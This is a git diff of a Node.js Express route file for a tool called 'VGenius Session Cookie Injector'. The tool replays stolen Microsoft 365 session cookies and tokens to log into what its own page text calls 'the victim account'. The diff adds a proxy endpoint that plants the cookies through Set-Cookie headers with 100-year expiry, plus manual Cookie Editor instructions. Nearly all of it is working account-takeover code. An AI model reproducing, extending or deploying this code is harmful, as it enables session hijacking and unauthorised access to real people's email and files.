@@ -1,20 +1,19 @@
+/**
+ * VGenius C Engine - Cookie Injection Routes
+ * Provides working cookie injection via server-side proxy redirect
+ */
 const express = require('express');
 const router = express.Router();
 const db = require('../database/connection');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
 
-// ─── Cookie Injection Page - Redirect Method ────────────────────────
-// Accepts JWT via query param (?jwt=xxx) for popup-based injection
+// ─── Cookie Injection Page ──────────────────────────────────────
 router.get('/page/:id', async (req, res) => {
   try {
-    // Extract JWT from query param or header
     let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
-    if (!jwtToken) {
-      return res.status(401).json({ error: 'Authentication required' });
-    }
+    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });
 
-    // Verify JWT token
     let decoded;
     try {
       decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
@@ -29,9 +28,9 @@ router.get('/page/:id', async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
+    const cookies = decrypt(token.cookies_encrypted);
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
-    const cookies = decrypt(token.cookies_encrypted);
 
     if (!cookies && !accessToken && !refreshToken) {
       return res.status(400).send('No tokens available');
@@ -49,32 +48,25 @@ router.get('/page/:id', async (req, res) => {
       }
     }
 
-    if (cookiesList.length === 0) {
-      return res.status(400).send('No cookies available');
-    }
+    if (cookiesList.length === 0) return res.status(400).send('No cookies available');
 
-    var clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var tokenId = req.params.id;
+    var jwt = req.query.jwt || '';
 
-    res.type('html').send(generateRedirectPage(cookiesList, clientId, tenant, tokenId, jwtToken));
+    res.type('html').send(generateInjectPage(cookiesList, clientId, tenant, jwt));
   } catch (err) {
     console.error('[CookieInject] Page error:', err);
     res.status(500).send('Server error');
   }
 });
 
-// ─── Direct Cookie String API ───────────────────────────────────────
-// Accepts JWT via query param for popup-based injection
+// ─── Direct Cookie String API ──────────────────────────────────────
 router.get('/raw/:id', async (req, res) => {
   try {
-    // Extract JWT from query param or header
     let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
-    if (!jwtToken) {
-      return res.status(401).json({ error: 'Authentication required' });
-    }
+    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });
 
-    // Verify JWT token
     let decoded;
     try {
       decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
@@ -135,7 +127,7 @@ router.get('/raw/:id', async (req, res) => {
   }
 });
 
-// ─── Parse Cookie String ────────────────────────────────────────────
+// ─── Parse Cookie String ───────────────────────────────────────────
 function parseCookies(cookieString) {
   if (!cookieString) return [];
 
@@ -157,7 +149,6 @@ function parseCookies(cookieString) {
           nameLower === 'path' ||
           nameLower === 'secure' ||
           nameLower === 'httponly' ||
-          nameLower === 'samesite' ||
           nameLower.startsWith('samesite=')) {
         continue;
       }
@@ -182,122 +173,148 @@ function parseCookies(cookieString) {
   return cookies;
 }
 
-// ─── Generate Redirect-Based Injector Page ──────────────────────────
-function generateRedirectPage(cookies, clientId, tenant, tokenId, jwtToken) {
+// ─── Generate Cookie Injection Page ────────────────────────────────
+function generateInjectPage(cookies, clientId, tenant, jwtToken) {
   var cookieJson = JSON.stringify(cookies);
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
 
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
-  html += '  <meta charset="UTF-8">\n';
-  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
-  html += '  <title>VGenius Cookie Injector</title>\n';
-  html += '  <style>\n';
-  html += '    body {\n';
-  html += '      font-family: Arial, sans-serif;\n';
-  html += '      padding: 20px;\n';
-  html += '      max-width: 800px;\n';
-  html += '      margin: 0 auto;\n';
-  html += '      background: #0a0a1a;\n';
-  html += '      color: #e0e0e0;\n';
-  html += '    }\n';
-  html += '    button {\n';
-  html += '      margin: 10px 5px;\n';
-  html += '      padding: 12px 24px;\n';
-  html += '      cursor: pointer;\n';
-  html += '      background: #00ccff;\n';
-  html += '      color: #000;\n';
-  html += '      border: none;\n';
-  html += '      border-radius: 6px;\n';
-  html += '      font-weight: bold;\n';
-  html += '      font-size: 14px;\n';
-  html += '    }\n';
-  html += '    button:hover { background: #00aacc; }\n';
-  html += '    .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
-  html += '    .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
-  html += '    .error { background: #2a0a0a; color: #f00; border: 1px solid #f00; }\n';
-  html += '    .info { background: #0a0a2a; color: #00f; border: 1px solid #00f; }\n';
-  html += '    pre { background: #000; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 11px; }\n';
-  html += '  </style>\n';
+  html += ' <meta charset="UTF-8">\n';
+  html += ' <title>VGenius Cookie Injector</title>\n';
+  html += ' <style>\n';
+  html += '   body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #0a0a1a; color: #e0e0e0; }\n';
+  html += '   button { padding: 12px 24px; cursor: pointer; background: #00ccff; color: #000; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; margin: 10px 5px; }\n';
+  html += '   button:hover { background: #00aacc; }\n';
+  html += '   button:disabled { background: #555; color: #999; cursor: not-allowed; }\n';
+  html += '   .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
+  html += '   .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
+  html += '   .error { background: #2a0a0a; color: #f00; border: 1px solid #f00; }\n';
+  html += '   .info { background: #0a0a2a; color: #00f; border: 1px solid #00f; }\n';
+  html += '   pre { background: #111; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 11px; color: #0f0; word-break: break-all; }\n';
+  html += '   .step { margin: 20px 0; padding: 15px; border: 1px solid #333; border-radius: 8px; }\n';
+  html += '   .step h3 { margin-top: 0; color: #00ccff; }\n';
+  html += ' </style>\n';
   html += '</head>\n<body>\n';
-  html += '  <h1 style="color:#00ccff">VGenius Session Cookie Injector</h1>\n';
-  html += '  <p>This will set your Microsoft session cookies and redirect you to Office.</p>\n';
-  html += '  <p><strong>Cookies available:</strong> ' + cookies.length + '</p>\n';
-  html += '  <p><strong>Token ID:</strong> ' + tokenId + '</p>\n';
-  html += '  <button onclick="startInjection()">SET COOKIES & OPEN OFFICE.COM</button>\n';
-  html += '  <div id="status"></div>\n';
-  html += '  <div id="details"></div>\n';
-  html += '  <script>\n';
-  html += '    var cookies = ' + cookieJson + ';\n';
-  html += '    var expStr = "' + expStr + '";\n';
-  html += '    var statusEl = document.getElementById("status");\n';
-  html += '    var detailsEl = document.getElementById("details");\n';
-  html += '    var tokenId = "' + tokenId + '";\n';
-  html += '    var jwtToken = "' + jwtToken + '";\n\n';
+  html += ' <h1 style="color:#00ccff">VGenius Session Cookie Injector</h1>\n';
+  html += ' <p>This page injects Microsoft session cookies and logs you into the victim account.</p>\n';
+  html += ' <p><strong>Cookies available:</strong> ' + cookies.length + '</p>\n\n';
 
-  // Show cookie details
-  html += '    function showDetails() {\n';
-  html += '      var h = "<h3>Cookie Details:</h3><pre>";\n';
-  html += '      for (var i = 0; i < cookies.length; i++) {\n';
-  html += '        h += cookies[i].name + "=" + cookies[i].value.substring(0, 20) + "...\\n";\n';
-  html += '      }\n';
-  html += '      h += "</pre>";\n';
-  html += '      detailsEl.innerHTML = h;\n';
-  html += '    }\n';
-  html += '    showDetails();\n\n';
+  // Method 1: One-click injection via server proxy
+  html += ' <div class="step">\n';
+  html += '   <h3>Method 1: One-Click Injection</h3>\n';
+  html += '   <p>Click below. Your browser will visit our proxy which sets the cookies and redirects to Microsoft login.</p>\n';
+  html += '   <button id="injectBtn" onclick="startInjection()">Inject Cookies & Login Now</button>\n';
+  html += '   <div id="status"></div>\n';
+  html += ' </div>\n\n';
 
-  // Start injection
-  html += '    function startInjection() {\n';
-  html += '      setStatus("Fetching cookies from server...", "info");\n\n';
+  // Method 2: Manual method
+  html += ' <div class="step">\n';
+  html += '   <h3>Method 2: Manual Cookie Injection</h3>\n';
+  html += '   <p>If Method 1 does not work, use a cookie editor extension:</p>\n';
+  html += '   <ol>\n';
+  html += '     <li>Install <a href="https://chrome.google.com/webstore/detail/cookie-editor/hlojalnbgnpgkeaafohfifofhlkjunhj" target="_blank" style="color:#00ccff">Cookie Editor</a></li>\n';
+  html += '     <li>Go to <a href="https://login.microsoftonline.com" target="_blank" style="color:#00ccff">login.microsoftonline.com</a></li>\n';
+  html += '     <li>Open Cookie Editor and paste these cookies:</li>\n';
+  html += '   </ol>\n';
+  html += '   <pre id="manualCookies"></pre>\n';
+  html += '   <button onclick="copyManualCookies()">Copy to Clipboard</button>\n';
+  html += ' </div>\n\n';
 
-  // Fetch raw cookies from API WITH JWT AUTH
-  html += '      fetch("/api/tokens/inject/raw/" + tokenId + "?jwt=" + encodeURIComponent(jwtToken))\n';
-  html += '        .then(function(r) { return r.json(); })\n';
-  html += '        .then(function(data) {\n';
-  html += '          if (!data.success) throw new Error(data.error);\n';
-  html += '          setStatus("Got ' + cookies.length + ' cookies. Setting them...", "info");\n';
-  html += '          setCookiesAndRedirect(data.cookie_string);\n';
-  html += '        })\n';
-  html += '        .catch(function(err) {\n';
-  html += '          setStatus("Error: " + err.message, "error");\n';
-  html += '        });\n';
-  html += '    }\n\n';
+  html += ' <script>\n';
+  html += '   var cookies = ' + cookieJson + ';\n';
+  html += '   var statusEl = document.getElementById("status");\n';
+  html += '   var injectBtn = document.getElementById("injectBtn");\n\n';
 
-  // Set cookies directly on current page, then redirect
-  html += '    function setCookiesAndRedirect(cookieString) {\n';
-  html += '      var parts = cookieString.split("; ");\n';
-  html += '      var count = 0;\n';
-  html += '      for (var i = 0; i < parts.length; i++) {\n';
-  html += '        try {\n';
-  html += '          var part = parts[i].trim();\n';
-  html += '          var eqIdx = part.indexOf("=");\n';
-  html += '          if (eqIdx > 0) {\n';
-  html += '            var cname = part.substring(0, eqIdx);\n';
-  html += '            var cval = part.substring(eqIdx + 1).split(";")[0];\n';
-  html += '            document.cookie = cname + "=" + cval + "; path=/; SameSite=None; Secure";\n';
-  html += '            count++;\n';
-  html += '          }\n';
-  html += '        } catch (e) {}\n';
-  html += '      }\n';
-  html += '      setStatus("Set " + count + " cookies. Redirecting to Microsoft Office...", "success");\n';
-  html += '      detailsEl.innerHTML += "<p>Cookies set: " + count + "</p>";\n\n';
+  // Show manual cookies
+  html += '   function showManualCookies() {\n';
+  html += '     var lines = [];\n';
+  html += '     for (var i = 0; i < cookies.length; i++) {\n';
+  html += '       lines.push(cookies[i].name + "=" + cookies[i].value);\n';
+  html += '     }\n';
+  html += '     document.getElementById("manualCookies").textContent = lines.join("\\n");\n';
+  html += '   }\n';
+  html += '   showManualCookies();\n\n';
 
-  // Redirect to Microsoft login page to authenticate with injected cookies
-  html += '      setTimeout(function() {\n';
-  html += '        window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  html += '      }, 800);\n';
-  html += '    }\n\n';
+  // Copy manual cookies
+  html += '   function copyManualCookies() {\n';
+  html += '     var text = document.getElementById("manualCookies").textContent;\n';
+  html += '     navigator.clipboard.writeText(text).then(function() {\n';
+  html += '       alert("Cookies copied!\\n\\nSteps:\\n1. Go to https://login.microsoftonline.com\\n2. Open Cookie Editor extension\\n3. Click Paste\\n4. Refresh the page");\n';
+  html += '     }).catch(function() {\n';
+  html += '       prompt("Copy these cookies manually:", text);\n';
+  html += '     });\n';
+  html += '   }\n\n';
 
-  // Status helper
-  html += '    function setStatus(msg, type) {\n';
-  html += '      statusEl.className = "status " + type;\n';
-  html += '      statusEl.innerHTML = msg;\n';
-  html += '    }\n';
-  html += '  </script>\n';
+  // Main injection function — direct redirect to proxy
+  html += '   function startInjection() {\n';
+  html += '     injectBtn.disabled = true;\n';
+  html += '     injectBtn.textContent = "Redirecting...";\n';
+  html += '     setStatus("Setting up secure cookie injection...", "info");\n\n';
+
+  // Build proxy URL with all cookie data
+  html += '     var proxyUrl = "/api/tokens/inject/proxy?cookies=" + encodeURIComponent(JSON.stringify(cookies));\n';
+  html += '     proxyUrl += "&tenant=' + tenant + '&client_id=' + clientId + '";\n\n';
+
+  // Use an iframe to trigger the cookie-setting redirect without losing the current page context
+  html += '     var iframe = document.createElement("iframe");\n';
+  html += '     iframe.style.display = "none";\n';
+  html += '     iframe.src = proxyUrl;\n';
+  html += '     document.body.appendChild(iframe);\n\n';
+
+  html += '     setStatus("Cookies being injected... Redirecting to Microsoft login in 2 seconds.", "success");\n';
+  html += '     setTimeout(function() {\n';
+  html += '       window.location.href = "https://login.microsoftonline.com/' + tenant + '/";\n';
+  html += '     }, 2000);\n';
+  html += '   }\n\n';
+
+  html += '   function setStatus(msg, type) {\n';
+  html += '     statusEl.className = "status " + type;\n';
+  html += '     statusEl.innerHTML = msg;\n';
+  html += '   }\n';
+  html += ' </script>\n';
   html += '</body>\n</html>';
 
   return html;
 }
+
+// ─── Cookie Injection Proxy Endpoint ──────────────────────────────
+// Sets cookies via Set-Cookie headers then redirects to Microsoft login
+router.get('/proxy', async (req, res) => {
+  try {
+    var cookiesStr = req.query.cookies || '';
+    var tenant = req.query.tenant || 'common';
+    var clientId = req.query.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+    if (!cookiesStr) return res.status(400).json({ error: 'No cookies provided', success: false });
+
+    var cookies = JSON.parse(decodeURIComponent(cookiesStr));
+    var expires = new Date();
+    expires.setFullYear(expires.getFullYear() + 100);
+    var expStr = expires.toUTCString();
+
+    // Build Set-Cookie headers for each cookie
+    var cookieHeaders = [];
+    for (var i = 0; i < cookies.length; i++) {
+      var c = cookies[i];
+      var domain = c.domain || '.login.microsoftonline.com';
+      var cookieHeader = c.name + '=' + encodeURIComponent(c.value) + '; ' +
+        'Domain=' + domain + '; ' +
+        'Path=/; ' +
+        'Expires=' + expStr + '; ' +
+        'SameSite=None; ' +
+        'Secure';
+      cookieHeaders.push(cookieHeader);
+    }
+
+    // Set cookies via Set-Cookie headers and redirect to Microsoft
+    res.set('Set-Cookie', cookieHeaders);
+    res.redirect('https://login.microsoftonline.com/' + tenant + '/');
+  } catch (err) {
+    console.error('[CookieInject] Proxy error:', err);
+    res.status(500).json({ error: 'Proxy failed: ' + err.message, success: false });
+  }
+});
 
 module.exports = router;
